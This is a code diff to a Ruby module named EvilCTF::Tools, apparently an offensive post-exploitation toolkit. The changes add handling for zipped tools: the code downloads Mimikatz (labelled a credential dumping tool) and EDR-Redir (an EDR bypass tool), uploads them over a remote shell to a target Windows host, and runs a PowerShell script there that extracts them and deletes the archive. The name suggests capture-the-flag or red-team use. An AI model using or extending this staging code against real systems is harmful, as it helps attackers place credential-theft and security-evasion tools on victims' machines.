@@ -34,7 +34,7 @@ module EvilCTF::Tools
     },
     'mimikatz' => {
       name: 'Mimikatz',
-      filename: 'mimikatz.exe',
+      filename: 'mimikatz_trunk.zip',
       search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
       description: 'Credential dumping tool',
       url: 'https://github.com/ParrotSec/mimikatz',
@@ -201,7 +201,7 @@ module EvilCTF::Tools
     },
     'edr_redir' => {
       name: 'EDR-Redir V2',
-      filename: 'EDR-Redir.exe',
+      filename: 'EDR-Redir_2.0.zip',
       search_patterns: ['EDR-Redir.exe'],
       description: 'EDR bypass tool using bind links',
       url: 'https://github.com/TwoSevenOneT/EDR-Redir',
@@ -515,8 +515,37 @@ end
     failures = []
     TOOL_REGISTRY.each do |key, tool|
       puts "\n[*] Checking #{tool[:name]} (#{key})..."
-      unless download_tool(key, remote_download: remote_download, shell: shell)
-        failures << key
+      
+      # For zipped tools, we need special handling
+      if tool[:zip]
+        local_path = File.join('tools', tool[:filename])
+        
+        # Check if zip file exists locally
+        unless File.exist?(local_path)
+          puts "[*] Downloading ZIP for #{tool[:name]}..."
+          unless download_tool(key, remote_download: remote_download, shell: shell)
+            failures << key
+            next
+          end
+        end
+        
+        # If we have the zip and are doing local staging, extract it locally first
+        if !remote_download && File.exist?(local_path) && tool[:zip_pick]
+          puts "[*] Extracting ZIP locally for #{tool[:name]}..."
+          begin
+            Zip::File.open(local_path) do |zip_file|
+              # Extract the specific file we need
+              zip_file.extract(tool[:zip_pick], local_path.gsub('.zip', '')) if zip_file.find_entry(tool[:zip_pick])
+            end
+          rescue => e
+            puts "[!] ZIP extraction failed locally: #{e.message}"
+          end
+        end
+      else
+        # Original behavior for non-zip tools
+        unless download_tool(key, remote_download: remote_download, shell: shell)
+          failures << key
+        end
       end
     end
     if failures.any?
@@ -530,13 +559,39 @@ end
   def self.safe_autostage(tool_key, shell, options, logger)
     tool = TOOL_REGISTRY[tool_key]
     return false unless tool
+    
+    # Check if we need to extract from ZIP
+    needs_extraction = tool[:zip] && (tool[:zip_pick] || tool[:zip_pick_x64] || tool[:zip_pick_x86])
+    
     remote_path = tool[:recommended_remote]
-    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
-    result = shell.run(check_cmd)
-    if result.output.include?('EXISTS')
-      puts "[+] #{tool[:name]} already staged at #{remote_path}"
-      return true
+    
+    # If it's a zip file, check for the extracted version instead
+    if needs_extraction
+      # For zipped tools, determine which file we're looking for after extraction
+      extracted_file = nil
+      
+      if tool[:zip_pick_x64] && get_system_architecture(shell) == 'x64'
+        extracted_file = tool[:zip_pick_x64].split('/').last
+      elsif tool[:zip_pick_x86] && get_system_architecture(shell) == 'x86'
+        extracted_file = tool[:zip_pick_x86].split('/').last
+      elsif tool[:zip_pick]
+        extracted_file = tool[:zip_pick].split('/').last
+      end
+      
+      if extracted_file
+        remote_path = File.join(File.dirname(tool[:recommended_remote]), extracted_file)
+        
+        check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
+        result = shell.run(check_cmd)
+        if result.output.include?('EXISTS')
+          puts "[+] #{tool[:name]} already staged at #{remote_path}"
+          return true
+        end
+      end
     end
+    
+    # ... existing code ...
+    
     arch = get_system_architecture(shell)
     puts "[*] System architecture: #{arch}"
     adjusted_tool = tool.dup
@@ -552,14 +607,65 @@ end
     elsif tool_key == 'mimikatz' && tool[:zip]
       adjusted_tool[:zip_pick] = (arch == 'x64') ? tool[:zip_pick_x64] : tool[:zip_pick_x86]
     end
+    
     local_path = find_tool_on_disk(tool_key)
     unless local_path && File.exist?(local_path)
       puts "[!] Local #{adjusted_tool[:filename]} not found. Attempting download..."
       local_path = download_tool(tool_key)
       return false unless local_path && File.exist?(local_path)
     end
-    puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
-    EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
+    
+    # For zipped tools, we need to extract on target
+    if needs_extraction
+      # Stage the zip file first
+      zip_remote_path = tool[:recommended_remote]
+      
+      # If it's a specific architecture-based zip pick, adjust remote path accordingly
+      if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
+        # For tools like nishang that have a single zip_pick
+        zip_remote_path = tool[:recommended_remote]
+      elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
+        # For architecture-specific zips, we still stage to the main path but extract appropriately
+        zip_remote_path = tool[:recommended_remote]
+      end
+      
+      puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"
+      
+      # Upload the zip file
+      success = EvilCTF::Uploader.upload_file(local_path, zip_remote_path, shell)
+      return false unless success
+      
+      # Create PowerShell extraction script
+      extract_ps = <<~PS
+        try {
+          $zipPath = '#{ps_single_quote_escape(zip_remote_path)}'
+          $extractPath = '#{ps_single_quote_escape(File.dirname(tool[:recommended_remote]))}'
+          
+          Add-Type -AssemblyName System.IO.Compression.FileSystem
+          [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+          
+          # Remove the zip file after extraction
+          Remove-Item $zipPath -Force
+          
+          "EXTRACTED"
+        } catch {
+          "ERROR: $($_.Exception.Message)"
+        }
+      PS
+      
+      result = shell.run(extract_ps)
+      if result.output.include?('EXTRACTED')
+        puts "[+] ZIP extracted successfully on target"
+        return true
+      else
+        puts "[!] ZIP extraction failed: #{result.output}"
+        return false
+      end
+    else
+      # Original behavior for non-zip tools
+      puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
+      EvilCTF::Uploader.upload_file(local_path, remote_path, shell)
+    end
   rescue => e
     puts "[!] Staging failed for #{tool_key}: #{e.message}"
     false
